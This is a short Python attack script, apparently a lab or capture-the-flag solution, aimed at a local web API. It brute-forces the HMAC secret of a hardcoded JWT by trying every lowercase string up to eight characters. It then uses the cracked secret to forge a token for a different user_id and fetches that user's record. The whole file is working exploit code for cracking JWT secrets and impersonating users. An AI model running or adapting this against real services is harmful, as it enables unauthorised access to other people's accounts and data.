import itertools
import string
import jwt
import requests
from datetime import datetime, timedelta


url = "http://127.0.0.1:5000"
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkzMjc3NDkuNzg0Mzg4LCJpYXQiOjE2MTkzMjc2NDkuNzg0Mzg4LCJ1c2VyX2lkIjoiODQ2NDAyNzMifQ.e7CR9svGDXVJ_TqIfiLF3jwVbdjA3IQ2pYOEEwBoXCw"
letters = string.ascii_lowercase
number_of_letters = 8


def test(token, secret: str):
    try:
        jwt.decode(token, secret, algorithms=['HS256'], options={"verify_exp": False})
        return secret
    except:
        pass

    return None

def force(count):
    tried = 0
    for i in range(1, count+1):
        for secret in itertools.product(letters, repeat=i):
            result = test(token, ''.join(secret))
            if result:
                return result
            tried += 1
            if tried % 500000 == 0:
                print(tried)

secret = force(number_of_letters)
print(secret)

payload = {
    'exp': (datetime.now() + timedelta(days=0, seconds=100)).timestamp(),
    'iat': datetime.now().timestamp(),
    'user_id': "43274923"
}
admin_token = jwt.encode(payload, secret, algorithm='HS256')
response = requests.get(f"{url}/api/users/43274923", headers={"Authorization": f"Beaver {admin_token}"})
print(response.json())
